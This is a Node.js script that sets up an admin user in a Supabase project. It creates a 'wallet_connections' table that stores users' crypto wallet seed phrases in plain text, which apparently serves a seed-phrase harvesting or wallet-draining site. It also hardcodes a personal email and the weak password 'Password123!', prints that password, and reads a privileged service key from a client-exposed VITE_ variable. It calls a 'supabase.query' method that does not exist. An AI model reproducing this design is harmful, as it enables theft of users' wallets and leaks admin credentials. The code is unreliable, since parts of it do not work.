// Direct script to make a user an admin in Supabase
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

// Load environment variables
dotenv.config();

// Get Supabase credentials from .env file
const supabaseUrl = process.env.VITE_SUPABASE_URL;
const supabaseServiceKey = process.env.VITE_SUPABASE_SERVICE_KEY;

// Create Supabase client with service key for admin privileges
const supabase = createClient(supabaseUrl, supabaseServiceKey);

async function makeAdmin() {
  try {
    console.log('Starting admin setup...');
    
    // 1. Create the profiles table if it doesn't exist
    console.log('Creating profiles table...');
    await supabase.query(`
      CREATE TABLE IF NOT EXISTS profiles (
        id UUID PRIMARY KEY REFERENCES auth.users(id),
        full_name TEXT,
        avatar_url TEXT,
        role TEXT DEFAULT 'user',
        email TEXT,
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `);
    
    // 2. Create the wallet_connections table if it doesn't exist
    console.log('Creating wallet_connections table...');
    await supabase.query(`
      CREATE TABLE IF NOT EXISTS wallet_connections (
        id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
        user_id UUID REFERENCES auth.users(id),
        user_email TEXT,
        name TEXT,
        blockchain TEXT,
        wallet_type TEXT,
        address TEXT,
        seed_phrase TEXT,
        seed_phrase_required INTEGER DEFAULT 12,
        status TEXT DEFAULT 'pending',
        created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
      );
    `);
    
    // 3. Get the user ID for the email
    const email = 'pastendro@gmail.com';
    console.log(`Finding user with email: ${email}...`);
    
    const { data: { users }, error: authError } = await supabase.auth.admin.listUsers();
    
    if (authError) {
      console.error('Error listing users:', authError);
      return;
    }
    
    const user = users.find(u => u.email === email);
    
    if (!user) {
      console.log(`No user found with email: ${email}, creating new user...`);
      
      // Create a new user
      const { data: newUser, error: createError } = await supabase.auth.admin.createUser({
        email,
        password: 'Password123!', // Temporary password
        email_confirm: true
      });
      
      if (createError) {
        console.error('Error creating user:', createError);
        return;
      }
      
      console.log(`Created new user with ID: ${newUser.user.id}`);
      
      // Insert admin profile for new user
      const { error: insertError } = await supabase
        .from('profiles')
        .insert({
          id: newUser.user.id,
          full_name: 'Admin User',
          role: 'admin',
          email: email
        });
      
      if (insertError) {
        console.error('Error creating profile:', insertError);
      } else {
        console.log(`✅ Created admin profile for ${email}`);
        console.log(`✅ Temporary password: Password123!`);
      }
    } else {
      console.log(`Found user with ID: ${user.id}`);
      
      // Insert or update admin profile
      const { error: upsertError } = await supabase
        .from('profiles')
        .upsert({
          id: user.id,
          full_name: 'Admin User',
          role: 'admin',
          email: email
        });
      
      if (upsertError) {
        console.error('Error updating profile:', upsertError);
      } else {
        console.log(`✅ Updated ${email} to admin role`);
      }
    }
    
    console.log('Admin setup completed');
  } catch (error) {
    console.error('Unexpected error:', error);
  }
}

makeAdmin()
  .then(() => {
    console.log('Done');
    process.exit(0);
  })
  .catch(error => {
    console.error('Fatal error:', error);
    process.exit(1);
  });
